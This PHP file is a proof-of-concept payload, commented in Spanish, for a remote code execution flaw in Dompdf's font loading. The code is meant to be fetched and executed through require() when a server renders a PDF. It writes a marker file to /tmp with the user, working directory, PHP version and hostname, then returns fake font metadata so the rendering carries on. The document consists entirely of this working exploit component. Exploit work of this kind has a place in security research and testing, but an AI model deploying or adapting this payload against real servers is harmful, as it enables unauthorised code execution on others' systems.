<?php
// RCE Proof of Concept - Dompdf Font Loading Exploit
// Este archivo se ejecuta cuando Dompdf lo descarga y hace require()

// Crear archivo de prueba en /tmp/ (accesible desde el contenedor)
$proof_file = '/tmp/rce_pwned_' . time() . '.txt';
$content = "RCE CONFIRMADO!\n";
$content .= "Tiempo: " . date('Y-m-d H:i:s') . "\n";
$content .= "Usuario: " . get_current_user() . "\n";
$content .= "CWD: " . getcwd() . "\n";
$content .= "PHP Version: " . phpversion() . "\n";
$content .= "Hostname: " . gethostname() . "\n";

file_put_contents($proof_file, $content);

// También retornar array para que Dompdf no rompa
return array(
    'name' => 'RCE',
    'type' => 'TrueType',
    'desc' => 'RCE Proof'
);
?>
